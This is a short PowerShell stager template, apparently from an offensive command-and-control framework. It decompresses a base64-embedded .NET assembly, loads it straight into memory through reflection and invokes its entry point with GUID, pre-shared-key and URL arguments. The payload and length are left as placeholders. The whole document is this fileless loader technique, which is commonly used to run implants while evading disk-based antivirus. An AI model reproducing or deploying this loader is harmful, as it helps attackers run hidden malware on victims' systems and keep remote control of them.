[string[]]$ARGS_NAME = @($Guid, $Psk, $Url)

$EncodedCompressedFile = @'
BASE64_ENCODED_ASSEMBLY
'@

$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
$UncompressedFileBytes = New-Object Byte[](DATA_LENGTH)
$DeflatedStream.Read($UncompressedFileBytes, 0, DATA_LENGTH) | Out-Null
$asm = [Reflection.Assembly]::Load($UncompressedFileBytes)
$asm.EntryPoint.Invoke($null, [object[]](,$ARGS_NAME))
